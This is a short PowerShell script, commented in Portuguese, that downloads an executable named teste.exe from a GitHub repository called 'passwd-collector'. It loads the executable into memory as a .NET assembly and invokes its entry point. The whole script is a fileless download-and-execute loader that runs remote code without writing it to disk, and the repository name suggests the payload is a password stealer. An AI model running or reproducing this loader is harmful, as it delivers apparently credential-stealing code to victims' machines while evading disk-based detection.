# URL do executável no GitHub
$url = "https://github.com/felipejussen/passwd-collector/raw/refs/heads/main/teste.exe"

# Usando WebClient para baixar e executar o executável em memória
$client = New-Object System.Net.WebClient
$bytes = $client.DownloadData($url)

# Criando um assembly em memória
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Executando o método principal do assembly
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, $null)
